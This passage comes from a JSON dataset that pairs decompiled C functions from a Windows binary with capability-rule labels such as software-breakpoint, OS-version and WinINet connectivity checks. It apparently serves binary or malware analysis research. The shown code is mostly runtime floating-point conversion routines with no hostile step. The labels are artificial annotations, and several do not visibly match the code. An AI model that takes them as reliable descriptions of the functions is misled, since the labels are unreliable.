0xfffffffd;\n            }\n            goto code_r0x00412aaf;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00412aa1;\n        goto code_r0x00412a6f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00412aaf:\n    fcn.0040c6a5(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "00413101": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413101(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00413602;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00413236;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0041323d;\ncode_r0x00413236:\n                        do {\n                            var_4h = 1;\ncode_r0x0041323d:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041324b;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041324b:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4190f4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4190f4 < iVar12) {\n                if (iVar12 < *0x4190f0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x4190f0;\n                    uVar5 = 1;\n                }\n                goto code_r0x00413602;\n            }\n            var_10h = *0x4190f4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004133ee;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004133ee:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00413602:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3661
    },
    "00413645": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413645(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00413b46;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x419110 - 1;\n        iVar4 = *0x419110 + (*0x419110 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x419110 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0041377a;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00413781;\ncode_r0x0041377a:\n                        do {\n                            var_4h = 1;\ncode_r0x00413781:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041378f;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041378f:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x41910c - *0x419110) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x41910c < iVar12) {\n                if (iVar12 < *0x419108) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x41911c;\n                    iVar4 = *0x419114 + (*0x419114 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x419114 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x419114 + (*0x419114 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x419114 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x41911c + *0x419108;\n                    uVar5 = 1;\n                }\n                goto code_r0x00413b46;\n            }\n            var_10h = *0x41910c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x419110 - 1;\n            iVar12 = *0x419110 + (*0x419110 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x419110 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00413932;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00413932:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x419114 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00413b46:\n    var_20h = iVar12 << (0x1fU - *0x419114 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x419118 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x419118 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3612
    },
    "00413b89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00413e4b)\n// WARNING: Removing unreachable block (ram,0x00413e14)\n// WARNING: Removing unreachable block (ram,0x004141fc)\n// WARNING: Removing unreachable block (ram,0x00413e23)\n// WARNING: Removing unreachable block (ram,0x00413e2b)\n// WARNING: Removing unreachable block (ram,0x00413e31)\n// WARNING: Removing unreachable block (ram,0x00413e34)\n// WARNING: Removing unreachable block (ram,0x00413e3b)\n// WARNING: Removing unreachable block (ram,0x00413e45)\n// WARNING: Removing unreachable block (ram,0x00413ea0)\n// WARNING: Removing unreachable block (ram,0x00413e9a)\n// WARNING: Removing unreachable block (ram,0x00413ea6)\n// WARNING: Removing unreachable block (ram,0x00413ec3)\n// WARNING: Removing unreachable block (ram,0x00413ec5)\n// WARNING: Removing unreachable block (ram,0x00413ecd)\n// WARNING: Removing unreachable block (ram,0x00413ed0)\n// WARNING: Removing unreachable block (ram,0x00413ed5)\n// WARNING: Removing unreachable block (ram,0x00413ed8)\n// WARNING: Removing unreachable block (ram,0x00414205)\n// WARNING: Removing unreachable block (ram,0x00413ee3)\n// WARNING: Removing unreachable block (ram,0x0041421c)\n// WARNING: Removing unreachable block (ram,0x00414223)\n// WARNING: Removing unreachable block (ram,0x00413eee)\n// WARNING: Removing unreachable block (ram,0x00413f01)\n// WARNING: Removing unreachable block (ram,0x00413f03)\n// WARNING: Removing unreachable block (ram,0x00413f10)\n// WARNING: Removing unreachable block (ram,0x00413f15)\n// WARNING: Removing unreachable block (ram,0x00413f1b)\n// WARNING: Removing unreachable block (ram,0x00413f24)\n// WARNING: Removing unreachable block (ram,0x00413f2b)\n// WARNING: Removing unreachable block (ram,0x00413f43)\n// WARNING: Removing unreachable block (ram,0x00413f54)\n// WARNING: Removing unreachable block (ram,0x00413f62)\n// WARNING: Removing unreachable block (ram,0x00413fa1)\n// WARNING: Removing unreachable block (ram,0x00413faa)\n// WARNING: Removing unreachable block (ram,0x004141c2)\n// WARNING: Removing unreachable block (ram,0x00413fb8)\n// WARNING: Removing unreachable block (ram,0x00413fc2)\n// WARNING: Removing unreachable block (ram,0x004141dd)\n// WARNING: Removing unreachable block (ram,0x00413fcf)\n// WARNING: Removing unreachable block (ram,0x00413fd6)\n// WARNING: Removing unreachable block (ram,0x00413fe0)\n// WARNING: Removing unreachable block (ram,0x00413fe5)\n// WARNING: Removing unreachable block (ram,0x00413ff5)\n// WARNING: Removing unreachable block (ram,0x00413ffa)\n// WARNING: Removing unreachable block (ram,0x00414004)\n// WARNING: Removing unreachable block (ram,0x00414009)\n// WARNING: Removing unreachable block (ram,0x0041401b)\n// WARNING: Removing unreachable block (ram,0x00414028)\n// WARNING: Removing unreachable block (ram,0x00414037)\n// WARNING: Removing unreachable block (ram,0x00414044)\n// WARNING: Removing unreachable block (ram,0x00414061)\n// WARNING: Removing unreachable block (ram,0x00414065)\n// WARNING: Removing unreachable block (ram,0x0041406c)\n// WARNING: Removing unreachable block (ram,0x00414075)\n// WARNING: Removing unreachable block (ram,0x00414078)\n// WARNING: Removing unreachable block (ram,0x00414089)\n// WARNING: Removing unreachable block (ram,0x00414097)\n// WARNING: Removing unreachable block (ram,0x004140a2)\n// WARNING: Removing unreachable block (ram,0x004140a9)\n// WARNING: Removing unreachable block (ram,0x004140d4)\n// WARNING: Removing unreachable block (ram,0x004140d9)\n// WARNING: Removing unreachable block (ram,0x004140e4)\n// WARNING: Removing unreachable block (ram,0x004140ed)\n// WARNING: Removing unreachable block (ram,0x004140f3)\n// WARNING: Removing unreachable block (ram,0x004140f6)\n// WARNING: Removing unreachable block (ram,0x0041411c)\n// WARNING: Removing unreachable block (ram,0x00414121)\n// WARNING: Removing unreachable block (ram,0x00414126)\n// WARNING: Removing unreachable block (ram,0x00414133)\n// WARNING: Removing unreachable block (ram,0x00414144)\n// WARNING: Removing unreachable block (ram,0x00414175)\n// WARNING: Removing unreachable block (ram,0x0041414a)\n// WARNING: Removing unreachable block (ram,0x00414170)\n// WARNING: Removing unreachable block (ram,0x00414154)\n// WARNING: Removing unreachable block (ram,0x0041416a)\n// WARNING: Removing unreachable block (ram,0x00414163)\n// WARNING: Removing unreachable block (ram,0x00414178)\n// WARNING: Removing unreachable block (ram,0x004141a5)\n// WARNING: Removing unreachable block (ram,0x00414182)\n// WARNING: Removing unreachable block (ram,0x0041400d)\n// WARNING: Removing unreachable block (ram,0x00413fea)\n// WARNING: Removing unreachable block (ram,0x004141e0)\n// WARNING: Removing unreachable block (ram,0x00413f26)\n// WARNING: Removing unreachable block (ram,0x004141ea)\n// WARNING: Removing unreachable block (ram,0x0041422b)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.00413b89(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00407d6a();\n        *puVar2 = 0x16;\n        fcn.004097f9(0, 0, 0, 0, 0);\n        fcn.0040c6a5(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x00413c1c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x414251\n    (**0x414251)();\n    return;\n}\n",
        "token_count": 1804
    },
    "00415388": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00415388(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        